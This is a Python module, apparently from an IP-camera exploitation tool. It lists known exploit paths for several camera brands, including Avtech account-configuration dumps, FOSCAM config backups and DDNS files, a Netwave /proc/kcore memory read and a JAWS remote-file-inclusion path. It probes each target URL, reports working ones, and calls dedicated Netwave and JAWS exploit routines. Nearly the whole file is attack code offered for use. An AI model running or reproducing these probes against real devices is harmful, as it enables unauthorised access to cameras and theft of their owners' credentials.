#!/usr/bin/env python3  
#-*- coding: utf-8 -*-

from config import INFO, LINE, WARNING, LESS
from exploits.netwave import netwaveCam
from exploits.jaws import jaws_exploit
import requests
import os, sys

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

exploits = {
    "Netcam": "anony/mjpg.cgi",
    "Netwave": "/proc/kcore",
    "JAWS": "jaws/libraries/pear/MDB2.php?file_name=[RFI]",
    "TAS-Tech": "user.html",
    "Avtech": ["cgi-bin/nobody/Machine.cgi?action=get_capability",
                "cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*",
                "cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"],
    "FOSCAM": ["tmpfs/config_backup.bin",
                "tmpfs/config_restore.bin",
                "tmpfs/ddns.conf",
                "tmpfs/syslog.txt",
                "log/syslog.txt"],
}

def other_exploit(camera, url, url_exploit, s):
    #Test particulary exploits
    if camera == "Netwave":
        netwave = netwaveCam()
        netwave.exploit_netwave(url_exploit, netwave)
        return True
    elif camera == "JAWS":
        jaws_exploit(camera, url, s)
        return True


def test_exploit(url_exploit):
    #just fonction to test known url exploit, that's for the multi and single test
    try:
        req_exploit = requests.head(url_exploit, verify=False, timeout=6, allow_redirects=False)
    except:
        try:
            req_exploit = requests.get(url_exploit, verify=False, timeout=6, allow_redirects=False)
        except:
            req_exploit = False
    if req_exploit and req_exploit.status_code == 200:
        print("{}Vulnerability worked, go on: \n => {}\n".format(WARNING, url_exploit))
        return True


def check_exploit(camera, url, s):
    particulary_exploit = ["Netwave", "JAWS"]
    print("\n{}Exploit\n".format(INFO))
    exploit_found = False
    for exploit in exploits:
        if camera == exploit:
            if camera in particulary_exploit:
                url_exploit = "{}{}".format(url, exploits[exploit])
                exploit_found = other_exploit(camera, url, url_exploit, s)

            if type(exploits[exploit]) == list:
                for e in exploits[exploit]:
                    print("{}Testing vulnerability {} for {} camera".format(INFO, e, exploit))
                    url_exploit = "{}{}".format(url, e)
                    ef = test_exploit(url_exploit)
                    if ef:
                        exploit_found = True
            else:
                if camera not in particulary_exploit:
                    print("{}Testing vulnerability {} for {} camera \n".format(INFO, exploits[exploit], exploit))
                    url_exploit = "{}{}".format(url, exploits[exploit])
                    exploit_found = test_exploit(url_exploit)
    if not exploit_found:
        print("{} Nothing exploit found for this camera".format(LESS))
    print(LINE)